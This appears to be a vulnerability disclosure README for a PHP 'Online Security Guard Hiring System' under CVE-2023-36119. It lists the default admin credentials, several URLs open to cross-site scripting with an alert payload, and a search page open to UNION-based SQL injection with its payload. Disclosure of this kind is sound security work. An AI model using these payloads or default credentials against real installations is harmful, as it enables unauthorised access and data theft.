# Online Security Guard Hiring System
+ version 1.0
+ vendors : [Online Security Guards Hiring System using PHP and MySQL](https://phpgurukul.com/online-security-guards-hiring-system-using-php-and-mysql/)
+ Software Link: https://phpgurukul.com/projects/Online-Security-Guard-Hiring-System_PHP.zip
+ Tested on: Windows 10 + XAMPP
+ Credential for admin panel :
  + Username: admin
  + Password: Test@123
+ CVE ID: CVE-2023-36119
+ CVSS 3.1: `AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:L/E:F/RL:W/RC:R/CR:H/IR:M/AR:M/MAV:L/MAC:H/MPR:L/MUI:R/MS:U/MC:L/MI:L/MA:L`
![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/101f9244-d698-4f4c-99ab-da20b6f08e05)

**Affecr URL**
+ XSS
  + http://localhost/osghs/admin/admin-profile.php --> Admin Name
  + http://localhost/osghs/admin/search.php --> Search Booking
  + http://localhost/osghs/search-request.php -->  Search Booking
  + http://localhost/osghs/admin/view-booking-detail.php?bookingid=XXX 

payload -> <script>alert(1)</script> 

![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/44e50c20-6d7f-454e-86ef-13814460ad2b)
![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/eb1b3b57-ba6e-4d7a-bccc-ad90a017e36a)
![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/340d324d-ee0a-4119-b4bf-dd0824ec0189)

+ SQL injection

payload -> ' UNION SELECT NULL,NULL,NULL--

+ http://localhost/osghs/admin/search.php

+ POC
  
https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/667cad95-bf9d-4636-9d7b-2145e1a68963

